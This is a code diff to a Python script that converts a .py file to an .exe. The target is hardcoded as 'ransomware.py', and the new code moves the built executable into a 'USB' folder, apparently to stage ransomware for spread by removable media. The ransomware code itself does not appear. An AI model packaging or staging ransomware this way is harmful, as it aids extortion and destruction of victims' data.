@@ -1,5 +1,8 @@
-import subprocess
 import os
+import subprocess
+import shutil
+
+current_path = os.path.abspath(r".")
 
 def convert_to_exe(py_file):
     if not os.path.isfile(py_file):
@@ -16,15 +19,26 @@ def convert_to_exe(py_file):
     try:
         subprocess.run(command, check=True)
         print(f"\nSuccessfully converted {py_file} to .exe.")
-        print("Check the 'dist' folder in the current directory.")
+        print("File Successfully Generated")
+        
+        origin = os.path.join("dist", os.path.basename(py_file).replace(".py", ".exe"))
+        origin = os.path.join(current_path, origin)
+        destination = os.path.join("USB", os.path.basename(py_file).replace(".py", ".exe"))
+        destination = os.path.join(current_path, destination)
+        
+        try:
+            shutil.move(origin, destination)
+            print(f"Check the 'USB' directory for the .exe file.")
+        except Exception as e:
+            print(f"Failed to move file: {e}\nCheck the 'dist' directory for the .exe file.")
+
     except subprocess.CalledProcessError as e:
         print("Error during conversion:", e)
 
 def find_py_file():
     # Enter path automatically
-    py_file = "ransomware.py"
+    py_file = r"ransomware.py"
     
-    current_path = os.path.abspath(".")
     py_file = os.path.join(current_path, py_file)
 
     if(os.path.isfile(py_file)):
@@ -32,7 +46,7 @@ def find_py_file():
     else:
         # If path is not set in this .py file
         for file in os.listdir(current_path):
-            if file.endswith(".py") and file != "convert_py_to_exe.py":
+            if file.endswith(r".py") and file != r"convert_py_to_exe.py":
                 py_file = os.path.join(current_path, file)
     
     if(os.path.isfile(py_file)):
